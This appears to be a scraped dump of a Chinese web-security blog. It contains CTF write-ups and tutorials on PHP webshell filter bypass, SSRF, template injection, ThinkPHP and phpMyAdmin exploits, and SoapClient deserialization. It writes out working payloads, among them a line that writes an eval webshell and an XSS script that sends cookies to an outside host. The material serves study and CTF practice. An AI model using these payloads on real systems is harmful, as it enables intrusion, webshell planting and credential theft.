die(&#x27;You are too good for me&#x27;); &#125; $blacklist = get_defined_functions()[&#x27;internal&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;You deserve better&#x27;); &#125; &#125; assert($code);&#125; 看到这个题第一反应就是无字母webshell，参考这篇文章。 但是又不太一样，题目有两层过滤，第一个正则过滤了一些符号了flag.ph中任意的字符，第二个foreach过滤了所有内置函数。 取反 利用下面的脚本取反，构造system(end(getallheaders())) 123def get(shell): hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit) 然后在header最后加上cat flag.php即可。 异或 参考这篇文章，简单分析一下。 1234567891011121314&lt;?php$hhh = @$_GET[&#x27;_&#x27;];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die(&#x27;One inch long, one inch strong!&#x27;);&#125;if ( preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;, $hhh) ) die(&#x27;Try something else!&#x27;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 可以看到这道题更为严格： 传入的字符长度不能超过18； 绕过preg_march正则表达式 count_chars()&gt;12的重复字符串绕过 第一个可以用构造_GET[x]来绕过，重点是正则表达式的绕过，先来看一下过滤了什么字符： 查看当前可以通过正则检测的字符： 12345678&lt;?phpfor($i=0;$i&lt;256;$i++)&#123; if (!preg_match(&#x27;/[\\x00- 0-9A-Za-z\\&#x27;&quot;\\`~_&amp;.,|=[\\x7F]+/i&#x27;,chr($i)))&#123; echo $i; #echo chr($i); echo(&quot;,&quot;); &#125;&#125; 再用下面的脚本找到能异或出_GET的字符： 12345678910111213141516171819202122a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,]#a是上面的php脚本出来的数据，通过preg_match的字符_=[]G=[]E=[]T=[]for i in a[27:]:#截取a列表27后面的数据，目的是避开可视字符。我们需要不可视字符来异或 for j in a[27:]: tem=(i^j) if(chr(tem)==&quot;_&quot;): _.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if(chr(tem)==&quot;G&quot;): G.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if (chr(tem) == &quot;E&quot;): temp = [] E.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:])) if (chr(tem)== &quot;T&quot;): T.append((str(hex(i)[2:])) + &quot;*&quot; + str(hex(j)[2:]))print(_)print(G)print(E)print(T) 有很多，用第一个来对原题试一试： 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%87&#125;)&amp;%86&#x3D;system&amp;%87&#x3D;cat%20flag.php 后记 CTFhub上面现在有这道题的复现环境，但是我发现用y1ng师傅和gml师傅的payload都会不行，用我这个异或方式的payload可以正常回显。 do you know [solved] 考点 代码审计 SSRF + XXE 解题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phphighlight_file(__FILE__);#本题无法访问外网#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好#there is xxe.php$poc=$_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&quot;/log|flag|hist|dict|etc|file|write/i&quot; ,$poc))&#123; die(&quot;no hacker&quot;); &#125;$ids=explode(&#x27;&amp;&#x27;,$poc);$a_key=explode(&#x27;=&#x27;,$ids[0])[0];$b_key=explode(&#x27;=&#x27;,$ids[1])[0];$a_value=explode(&#x27;=&#x27;,$ids[0])[1];$b_value=explode(&#x27;=&#x27;,$ids[1])[1];if(!$a_key||!$b_key||!$a_value||!$b_value)&#123; die(&#x27;我什么都没有~&#x27;);&#125;if($a_key==$b_key)&#123; die(&quot;trick&quot;);&#125;if($a_value!==$b_value)&#123; if(count($_GET)!=1) &#123; die(&#x27;be it so&#x27;); &#125;&#125;foreach($_GET as $key=&gt;$value)&#123; $url=$value;&#125;$ch = curl_init(); if ($type != &#x27;file&#x27;) &#123; #add_debug_log($param, &#x27;post_data&#x27;); // 设置超时 curl_setopt($ch, CURLOPT_TIMEOUT, 30); &#125; else &#123; // 设置超时 curl_setopt($ch, CURLOPT_TIMEOUT, 180); &#125; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // 设置header if ($type == &#x27;file&#x27;) &#123; $header[] = &quot;content-type: multipart/form-data; charset=UTF-8&quot;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); &#125; elseif ($type == &#x27;xml&#x27;) &#123; curl_setopt($ch, CURLOPT_HEADER, false); &#125; elseif ($has_json) &#123; $header[] = &quot;content-type: application/json; charset=UTF-8&quot;; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); &#125; // curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_AUTOREFERER, 1); // dump($param); curl_setopt($ch, CURLOPT_POSTFIELDS, $param); // 要求结果为字符串且输出到屏幕上 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 使用证书：cert 与 key 分别属于两个.pem文件 $res = curl_exec($ch); var_dump($res); 预期解 思路：用gopher进行ssrf发送post请求给xxe.php 先留一个坑位，等一手复现环境：https://blog.csdn.net/a3320315/article/details/106960331 非预期解 这里利用了$_SERVER['QUERY_STRING'];不会进行url解码，但是后面赋值是$_GET赋的值，保存的是解码后的值，也就是说waf检测的是url解码前的value，直接将 file:///var/www/html/flag.php 进行url编码，可以拿到flag。 payload： 1http:&#x2F;&#x2F;121.36.64.91&#x2F;?a&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b&#x3D;%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70 Laravel [unsolved] 源码下载： 链接：https://pan.baidu.com/s/1WEWSkDzyE5MXSh9CXQ-q3A 提取码：p88e 考点 PHP反序列化 POP链 解题 先留一个坑，先把PHP的依赖注入的知识学完，不然看源码有点吃力。 美团外卖 [unsolved] 源码下载： 链接：https://pan.baidu.com/s/1sjERSDUUOf0O63BLqW1hZw 提取码：359o 考点 SQL注入 代码审计 解题 暂时还没有复现环境，只能云做题了，参考： https://www.gem-love.com/ctf/2380.html http://igml.top/2020/06/25/2020-第五空间智能安全大赛初赛wp/ 扫出来www.zip源码 首先是个登录框，看源码就很像GXYCTF2019 EasySQLiv1.0那道题的md5绕过。 12用户名 : &#39; union select &quot;0f5ed8a8d8d44d86a570aacffa922251&quot;#密码 : ca01h 可以登录，但是session里面的user不是admin。继续审计到daochu.php，SQL注入没有任何过滤，还有回显： 常规的SQL联合注入： 有个hint表，接着读列名是hints。再dump数据： 直接访问这个目录，和主页一样的界面，然而这里面没有www.zip了，接下来竟然要去lib文件夹里面去审计。。。😓 可以直接用find命令找一下PHP类型的文件，并且查看最近修改的文件，最后定位到lib/webuploader/0.1.5/server/preview.php，关键代码： 构造一个符合正则表达式的POST数据： 1data:image&#x2F;test;base64,test 题目返回了一个神秘文件，访问之后提示get file，所以就直接读flag就可以了。 还有一种解法是webuploader 0.1.5的公开漏洞： https://9finger.cn/2020/03/06/CNVD-2018-26054漏洞复现/#漏洞分析","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"buuctf刷题——PHP框架漏洞篇","date":"2020-06-27T02:57:08.000Z","path":"Web_security/ctf_writeup/5.buuctf刷题——PHP框架漏洞篇/","text":"BUUCTF——PHP框架漏洞篇 BJDCTF 2nd old-hacker 考点 ThinkPHP 5.0.23 RCE 解题 payload： 12index.php?s&#x3D;captchaPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag BJDCTF2020 The mystery of ip 考点 PHP Smarty 模板注入 解题 payload： 1X-Forward-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125; GKCTF2020 CVE版签到 考点 cve-2020-7066 解题 首先Google一下cve-2020-7066 在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\\0）字符，则URL将被静默地截断。 demo： 12345678910&lt;?php// user input$_GET[&#x27;url&#x27;] = &quot;http://localhost\\0.example.com&quot;;$host = parse_url($_GET[&#x27;url&#x27;], PHP_URL_HOST);if (substr($host, -12) !== &#x27;.example.com&#x27;) &#123; die();&#125;$headers = get_headers($_GET[&#x27;url&#x27;]);var_dump($headers); 在PHP7.1版本下会输出Null，在PHP7.2版本下会输出http://localhost 访问首页查看network 结合cve-2020-7066，用http://127.0.0.123%00www.ctfhub.com即可获得flag。 localhost不是单指127.0.0.1，而是符合127.0.0.0/24这一网段的IP地址，比如127.0.0.100也可以叫localhost GYCTF2019 我有一个数据库 考点 phpmyadmin 4.8.1 任意文件读取 解题 打开题目提示有一个数据库，访问robots.txt，发现phpinfo.php页面，过一遍之后没有什么可以利用的。（我都不知道为啥要给这个文件，反而把我给带偏了。） 扫一下目录，扫出来了phpmyadmin路径，访问后没有密码直接进入数据库管理页面，除了MySQL自带的两个数据库，确实没有其他的数据库，查看当前phpmyadmin版本是4.8.1，这个版本有一个CVE-2018-12613的公开漏洞，可以任意文件读取。那就直接上payload： 1index.php&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag 后记 知其然更要知其所以然，来复现一下phpmyadmin 4.8.1。 问题就出在第61行的include函数 前提是绕过55-59行的检查。 第55行和第56行都比较容易pass，第57行限制target参数不能以index开头，第58行限制target参数不能有$target_blacklist数组中的关键字，其中$target_blacklist包括import.php和export.php，第59行将target参数传入checkPageValidity进行检查，找到对应的函数。 12345678910111213141516171819202122232425262728293031323334public static function checkPageValidity(&amp;$page, array $whitelist = []) &#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false; &#125; 要想使该函数返回true，包含的文件必须包含在白名单$goto_whitelist中， 第14行到21行的代码是以?分割然后取出前面的字符串再判断值是否存在与$goto_whilelist某个数组中。 第23行到第31行代码是将$page参数用urlencode解码再进行以?分割取出前面的值做判断。 我把?两次url编码为 %253f 即可绕过验证。 那么传入target=db_sql.php%253f/../../etc/passwd，其中%253f是?号的二此url编码urlcode将$page解码后是db_sql.php?/../../etc/passwd ，再以?分割取出来前面的字符串为db_sql.php，​$goto_whitelist中有db_sql.php所以会进入最后一个if语句并返回true。 利用方式也比较简单，可以执行一下SELECT '&lt;?=phpinfo()?&gt;';，然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可： CISCN2019 华东南赛区 Web11 考点 smarty SSTI 解题 参考文章 页面提示两个API并不能用，但是在右上角还是看到了一个Current IP的显示，而且页脚还说明了这个站点用到了Smarty模板引擎，那么SSTI的注入点应该就是在X-Forward-For请求头。 用&#123;&#123;7*'7'&#125;&#125;测试一下 用网上常见的Smarty SSTI读文件的payload： 1&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125; 直接报错。 Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等。 按照if的这个特性，尝试执行phpinfo()，成功执行。 使用system函数可以执行ls命令，但是不能执行读文件的操作。那就直接用show_source函数 拓展 不同版本可以利用的方式不同，常用的有以下三种方法： 1.旧版Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令。 Smarty3的官方手册描述： 1Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用 2.旧版Smarty可以通过self获取Smarty类再调用其静态方法实现文件读写 3.PHP函数都可以在模板中使用，因此注入时，可以直接使用： 1&#123;system(&#39;ls&#39;)&#125; 便可随意执行命令；执行多条语句的话可以使用下面的形式： 1&#123;system(&#39;ls&#39;)&#125;&#123;system(&#39;cat index.php&#39;)&#125; -----------------分割线 攻防世界上有一道升级版的，限制disable_function以及open_basedir。 但是还是可以直接写shell，用蚁剑连接直接绕过。 1&#123;file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;)&#125; GYCTF2020 Easy Thinking 考点 ThinkPHP 6.0.0~6.0.2 任意文件上传 解题 随便测试发现用的框架是ThinkPHP6.0，Google一下就可以看到1月份爆出的任意文件上传的漏洞。 https://paper.seebug.org/1114 扫描之后有源码泄露www.zip，下载之后审计一下 123456789101112131415161718192021222324252627282930public function search() &#123; if (Request::isPost())&#123; if (!session(&#x27;?UID&#x27;)) &#123; return redirect(&#x27;/home/member/login&#x27;); &#125; $data = input(&quot;post.&quot;); $record = session(&quot;Record&quot;); if (!session(&quot;Record&quot;)) &#123; session(&quot;Record&quot;,$data[&quot;key&quot;]); &#125; else &#123; $recordArr = explode(&quot;,&quot;,$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3)&#123; array_shift($recordArr); session(&quot;Record&quot;,implode(&quot;,&quot;,$recordArr) . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125; &#125; session(&quot;Record&quot;,$record . &quot;,&quot; . $data[&quot;key&quot;]); return View::fetch(&quot;result&quot;,[&quot;res&quot; =&gt; &quot;There&#x27;s nothing here&quot;]); &#125;else&#123; return View(&quot;search&quot;); &#125; &#125; 发现 search搜索的地方有一个 session 的储存。 先注册一个账号，登录，然后搜索的时候抓包。 thinkphp6 会默认在 /runtime/session 创建一个sess_xxx格式的session文件，这里的xxx就是PHPSESSID（必须是32位），而文件的内容就是session的内容，也就是key的内容。 然后搜索的时候写入shell 再用蚁剑连接，用插件绕过disable_function。","tags":[{"name":"PHP","slug":"PHP","permalink":"http://ca0y1h.top/tags/PHP/"},{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"框架漏洞","slug":"CTF/框架漏洞","permalink":"http://ca0y1h.top/categories/CTF/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"}]},{"title":"PHP反序列化学习-字符逃逸","date":"2020-06-23T13:34:59.000Z","path":"Web_security/php_related/6.PHP反序列化学习-字符逃逸/","text":"从一道CTF题学习PHP反序列化的对象/字符逃逸","tags":[],"categories":[]},{"title":"PHP反序列化学习——原生类利用","date":"2020-06-23T08:01:53.000Z","path":"Web_security/php_related/5.PHP反序列化学习-原生类利用/","text":"从两道CTF题目学习PHP原生类反序列化利用 文章围绕着一个问题，如何在原本的代码中找不到pop链的时候，通过原生类构造反序列化漏洞？ 主要是两个原生类： SoapClient Error（PHP7）或Exception（PHP5和7） SoapClient + CLRF +SSRF 题目：2018LCTF Bestphp’s revenge SoapClient类 用来提供和使用 webservice。 1public SoapClient::SoapClient(mixed $wsdl[,array$options]) 第一个参数为WSDL 文件的 URI ，如果是NULL 意味着不使用 WSDL 模式。 第二个参数是一个数组，如果在WSDL 模式下，这个参数是可选的。如果在non-WSDL 模式下，必须设置location 和 uri 参数，location是要请求的 URL，uri是要访问的资源。 在官方文档中可以看到，它的user_agent 参数是可以控制 HTTP头部的 User-Agent 的。而在HTTP 协议中，header 与body 是用两个 \\r\\n分隔的，浏览器也是通过这两个 \\r\\n来区分 header 和body 的。 The user_agent option specifies string to use in User-Agent header. demo： 123456&lt;?php$a= array(&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1:20000/&#x27;,&#x27;uri&#x27;=&gt;&#x27;user&#x27;);$x= newSoapClient(NULL,$a);$y= serialize($x);$z= unserialize($y);$z-&gt;no_func(); 监听本地的20000端口： 12345678910POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1:20000Connection: Keep-AliveUser-Agent: PHP-SOAP&#x2F;5.5.9-1ubuntu4.29Content-Type: text&#x2F;xml; charset&#x3D;utf-8SOAPAction: &quot;user#no_func&quot;Content-Length: 371&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:ns1&#x3D;&quot;user&quot; xmlns:xsd&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot; xmlns:SOAP-ENC&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot; SOAP-ENV:encodingStyle&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:no_func&#x2F;&gt;&lt;&#x2F;SOAP-ENV:Body&gt;&lt;&#x2F;SOAP-ENV:Envelope&gt; 看这个POST的请求，发现有两个地方是可控的，User-Agent和 SOAPAction，而且明显Content-Type 和 Content-Length 都在User-Agent 之下，用 wupco 师傅的payload 就能进行任意的 POST请求，这里要先 urldecode 才可以进行反序列化。 exp.php 12345678910111213141516&lt;?php$target= &#x27;http://127.0.0.1/test.php&#x27;;$post_string= &#x27;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;;$headers= array( &#x27;X-Forwarded-For:127.0.0.1&#x27;, &#x27;Cookie:admin=1&#x27; );$b= new SoapClient(null,array(&#x27;location&#x27;=&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length:&#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt;&quot;peri0d&quot;));$aaa= serialize($b);$aaa= str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa= str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;$x= unserialize(urldecode($aaa));$x-&gt;no_func(); test.php 1234567&lt;?php if($_SERVER[&#x27;REMOTE_ADDR&#x27;]==&#x27;127.0.0.1&#x27;)&#123; echo &#x27;hi&#x27;; @$a=$_POST[1]; @eval($a);&#125;?&gt; 这样就可以成功写入shell.php。 Error/Exception + XSS 题目：BJDCTF 2rd XSS之光 Git泄露，用GitHack dump下来： 只有一个index.php文件： 123&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a); yds？？？杨大树？？？ Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。 Exception类跟Error类原理一样，但是也适用于PHP5 我们先来验证一下： POC 123&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);echo urlencode(serialize($a)); 得到编码后的反序列化结果： 1O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D 成功触发XSS。 也可以直接打cookie： 123&lt;?php$s = &#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;;echo serialize($s); SimpleXMLElement https://ca0y1h.top/code_audit/5.PHP代码审计学习——Day3/#SimpleXMLElementXXE漏洞","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"利用SoapClient类进行SSRF+CRLF攻击","date":"2020-06-23T03:59:10.000Z","path":"Web_security/php_related/10.利用SoapClient类进行SSRF-CRLF攻击/","text":"【转】利用SoapClient类进行SSRF+CRLF攻击 原文链接：https://lethe.site/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/# 太懒了，就不重复总结了。转载lethe师傅的一篇文章，侵权删文。 0x01 什么是Soap SOAP是webService三要素（SOAP、WSDL、UDDI）之一： WSDL 用来描述如何访问具体的接口。 UDDI用来管理，分发，查询webService。 SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。 其采用HTTP作为底层通讯协议，XML作为数据传送的格式。 0x02 PHP中的SoapClient类 参考链接：https://www.php.net/manual/zh/soapclient.soapclient.php PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。 该类的构造函数如下： 1public SoapClient :: SoapClient (mixed $wsdl [,array $options ]) 第一个参数是用来指明是否是wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。 我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url，如下 12345&lt;?php$a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://xxx.xxx.xxx&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));echo serialize($a);?&gt; 当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的__Call方法，然后向target_url发送一个soap请求，并且uri选项是我们可控的地方。 0x03 CRLF Injection CRLF是”回车 + 换行”(\\r\\n)的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 参考链接： [CRLF Injection漏洞的利用与实例分析](https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html) 0x04 SSRF+CRLF攻击内网 实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。 那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下： 可以看到options参数中还有一个选项为user_agent，运行我们自己设置User-Agent的值。 当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为Content-Type为和Content-Length都在User-Agent之下，而控制这两个是利用CRLF发送post请求最关键的地方。 最后给出wupco师傅的生成任意POST报文的POC: 1234567891011121314&lt;?php$target = &#x27;http://123.206.216.198/bbb.php&#x27;;$post_string = &#x27;a=b&amp;flag=aaa&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: xxxx=1234&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&#x27;%0d%0a&#x27;,$aaa);$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;%26&#x27;,$aaa);echo $aaa;?&gt; 如果是GET请求的话，那么构造好location就行： 1234567&lt;?php$url = &quot;http://127.0.0.1/flag.php&quot;;$b = new SoapClient(null, array(&#x27;uri&#x27; =&gt; $url, &#x27;location&#x27; =&gt; $url));$a = serialize($b);$a = str_replace(&#x27;^^&#x27;, &quot;\\r\\n&quot;, $a);echo &quot;|&quot; . urlencode($a);?&gt;","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"SSRF","slug":"SSRF","permalink":"http://ca0y1h.top/tags/SSRF/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP代码审计学习——Day5","date":"2020-06-17T03:58:41.000Z","path":"code_audit/7.PHP代码审计学习——Day5/","text":"PHP代码审计学习Day5——escapeshellarg与escapeshellcmd使用不当 0x01 postcart 12345678910111213141516171819202122232425262728293031323334353637class Mailer &#123; private function sanitize($email) &#123; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; return &#x27;&#x27;; &#125; return escapeshellarg($email); &#125; public function send($data) &#123; if (!isset($data[&#x27;to&#x27;])) &#123; $data[&#x27;to&#x27;] = &#x27;none@ripstech.com&#x27;; &#125; else &#123; $data[&#x27;to&#x27;] = $this-&gt;sanitize($data[&#x27;to&#x27;]); &#125; if (!isset($data[&#x27;from&#x27;])) &#123; $data[&#x27;from&#x27;] = &#x27;none@ripstech.com&#x27;; &#125; else &#123; $data[&#x27;from&#x27;] = $this-&gt;sanitize($data[&#x27;from&#x27;]); &#125; if (!isset($data[&#x27;subject&#x27;])) &#123; $data[&#x27;subject&#x27;] = &#x27;No Subject&#x27;; &#125; if (!isset($data[&#x27;message&#x27;])) &#123; $data[&#x27;message&#x27;] = &#x27;&#x27;; &#125; mail($data[&#x27;to&#x27;], $data[&#x27;subject&#x27;], $data[&#x27;message&#x27;], &#x27;&#x27;, &quot;-f&quot; . $data[&#x27;from&#x27;]); &#125;&#125;$mailer = new Mailer();$mailer-&gt;send($_POST); 这道题其实是考察由 php 内置函数 mail 所引发的命令执行漏洞。我们先看看 php 自带的 mail 函数的用法： mail ( string $to , string $subject , string $message [, mixed $additional_headers [, string $additional_parameters ]] ) : bool to，指定邮件接收者，即接收人 subject，邮件的标题 message，邮件的正文内容 additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC additional_parameters，指定传递给发送程序sendmail的额外参数。 在Linux系统上，send函数默认调用 Linux 的 sendmail 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种： -O option = value QueueDirectory = queuedir 选择队列消息 -X logfile 这个参数可以指定一个目录来记录发送邮件时的详细日志情况。 -f from email 这个参数可以让我们指定我们发送邮件的邮箱地址。 漏洞一 写一个demo： 12345678&lt;?php$to = &quot;Alice@example/com&quot;;$from = &quot;Hello Alice&quot;;$message = &quot;&lt;?php phpinfo(); ?&gt;&quot;;$headers = &quot;CC: somebodyelse@example.com&quot;;$options = &quot;-OQueueDirectory=/tmp -X /var/www/html/rce.php&quot;;mail($to, $subject, $message, $header, 